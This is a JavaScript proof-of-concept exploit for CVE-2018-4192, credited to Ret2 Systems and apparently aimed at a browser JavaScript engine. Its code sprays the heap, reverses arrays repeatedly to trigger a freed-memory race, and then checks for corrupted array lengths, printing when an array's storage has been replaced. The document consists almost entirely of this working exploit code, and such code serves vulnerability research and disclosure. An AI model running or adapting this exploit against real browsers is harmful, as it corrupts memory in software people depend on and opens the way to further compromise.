// CVE-2018-4192 Proof-of-Concept, by Ret2 Systems, Inc.

exit = false;
won = 0
limit = 10
save = [0, 0]
for(var at = 0; at < limit; at++) {

    //print("allocating");
    var someArray1 = new Array(1024);
    for (var i=0; i<someArray1.length; i++) {
        someArray1[i] = new Array(128).fill(0x41414141)
        //print("allocated " + i);
    }

    //print("spraying");
    v = []
    for (var i = 0; i < 506; i++) {
        for(var j = 0; j < 0x20; j++) {
            someArray1.reverse()
        }
        v.push(new String("B").repeat(0x10000*save.length/2))
    }

    //print("checking lengths");
    for (var i = 0; i < someArray1.length; i++) {
        if(someArray1[i].length != 128) {
            print("someArray1["+i+"].length has changed from 128 to "+someArray1[i].length);
            if (someArray1[i].length == 506) {
                print("[+] someArray1["+i+"]'s butterfly has been freed and replaced with v's,");
                print("    smashing the next butterflies and their lengths:");
            }
            exit = true;
        }
    }
    if (exit)
        quit();

    for (var i = 0; i < 0x100000; i++) { }

    //print("protection spray...");
    f = []
    for (var i = 0; i < 0x1000; i++) {
        f.push(new Array(16).fill(0x42424242))
        //print("protected " + i);
    }

    //print("saving...")
    save.push(someArray1)
    save.push(v)
    save.push(f)

    //print("Trying again....")
}

